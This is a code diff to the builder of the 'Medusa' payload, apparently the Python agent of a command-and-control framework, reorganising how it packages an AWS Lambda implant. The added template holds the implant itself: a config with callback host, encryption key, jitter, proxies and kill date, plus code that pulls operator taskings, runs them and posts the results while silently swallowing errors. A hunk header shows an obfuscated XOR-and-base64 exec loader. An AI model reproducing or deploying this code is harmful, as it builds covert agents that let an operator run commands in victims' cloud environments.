@@ -86,14 +86,6 @@ class Medusa(PayloadType):
             return filename         
 
     async def build(self) -> BuildResponse:
-        lambda_handler = """
-def lambda_handler(event, context):
-    medusa = medusa()
-    return {
-        'statusCode': 200,
-        'body': 'Medusa agent executed successfully'
-    }
-    """
         # this function gets called to create an instance of your payload
         resp = BuildResponse(status=BuildStatus.Success)
         # create the payload
@@ -117,6 +109,57 @@ def lambda_handler(event, context):
             else:
                 crypto_code = open(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto"), "r").read()
 
+            if self.selected_os == "AWS Lambda":
+                # Find the start of __init__ function and truncate
+                init_start = base_code.find("def __init__(self):")
+                base_code = base_code[:init_start]
+    
+                # Add our Lambda implementation with proper indentation
+                base_code += """
+    def __init__(self):
+        self.socks_open = {}
+        self.socks_in = queue.Queue()
+        self.socks_out = queue.Queue()
+        self.taskings = []
+        self._meta_cache = {}
+        self.moduleRepo = {}
+        self.current_directory = '/tmp'
+        self.agent_config = {
+            "Server": "callback_host",
+            "Port": "callback_port",
+            "PostURI": "/post_uri",
+            "PayloadUUID": "UUID_HERE",
+            "UUID": "UUID_HERE",
+            "Headers": headers,
+            "Sleep": callback_interval,
+            "Jitter": callback_jitter,
+            "KillDate": "killdate",
+            "enc_key": AESPSK,
+            "ExchChk": "encrypted_exchange_check",
+            "GetURI": "/get_uri",
+            "GetParam": "query_path_name",
+            "ProxyHost": "proxy_host",
+            "ProxyUser": "proxy_user",
+            "ProxyPass": "proxy_pass",
+            "ProxyPort": "proxy_port",
+        }
+        
+        if not self.passedKilldate():
+            try:
+                self.getTaskings()
+                self.processTaskings()
+                self.postResponses()
+            except:
+                pass
+
+def lambda_handler(event, context):
+    medusa = medusa()
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Medusa agent executed successfully')
+    }
+"""
+            
             base_code = base_code.replace("CRYPTO_HERE", crypto_code)
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_HERE", command_code)
@@ -183,74 +226,17 @@ exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encod
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully Built"
             elif self.get_parameter("output") == "lambda_zip":
-                # Find the start of __init__ function and truncate
-                init_start = base_code.find("def __init__(self):")
-                base_code = base_code[:init_start]
-    
-                # Add our Lambda implementation with proper indentation
-                base_code += """
-    def __init__(self):
-        self.socks_open = {}
-        self.socks_in = queue.Queue()
-        self.socks_out = queue.Queue()
-        self.taskings = []
-        self._meta_cache = {}
-        self.moduleRepo = {}
-        self.current_directory = '/tmp'
-        self.agent_config = {
-            "Server": "callback_host",
-            "Port": "callback_port",
-            "PostURI": "/post_uri",
-            "PayloadUUID": "UUID_HERE",
-            "UUID": "UUID_HERE",
-            "Headers": headers,
-            "Sleep": callback_interval,
-            "Jitter": callback_jitter,
-            "KillDate": "killdate",
-            "enc_key": AESPSK,
-            "ExchChk": "encrypted_exchange_check",
-            "GetURI": "/get_uri",
-            "GetParam": "query_path_name",
-            "ProxyHost": "proxy_host",
-            "ProxyUser": "proxy_user",
-            "ProxyPass": "proxy_pass",
-            "ProxyPort": "proxy_port",
-        }
-        
-        if not self.passedKilldate():
-            try:
-                self.getTaskings()
-                self.processTaskings()
-                self.postResponses()
-            except:
-                pass
-
-def lambda_handler(event, context):
-    medusa = medusa()
-    return {
-        'statusCode': 200,
-        'body': json.dumps('Medusa agent executed successfully')
-    }
-"""
-
                 # Create temp directory for Lambda package
                 with tempfile.TemporaryDirectory() as temp_dir:
                     # Write lambda function code
                     lambda_file = os.path.join(temp_dir, "lambda_function.py")
                     with open(lambda_file, "w") as f:
                         f.write(base_code)
-                        
-                    # Create requirements.txt
-                    requirements_file = os.path.join(temp_dir, "requirements.txt")
-                    with open(requirements_file, "w") as f:
-                        if self.get_parameter("use_non_default_cryptography_lib") == "Yes":
-                            f.write("cryptography\n")
                     
                     # Create zip file in memory
                     zip_buffer = io.BytesIO()
                     with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
                         zip_file.write(lambda_file, "lambda_function.py")
-                        zip_file.write(requirements_file, "requirements.txt")
                         
                     zip_buffer.seek(0)
                     resp.payload = zip_buffer.getvalue()
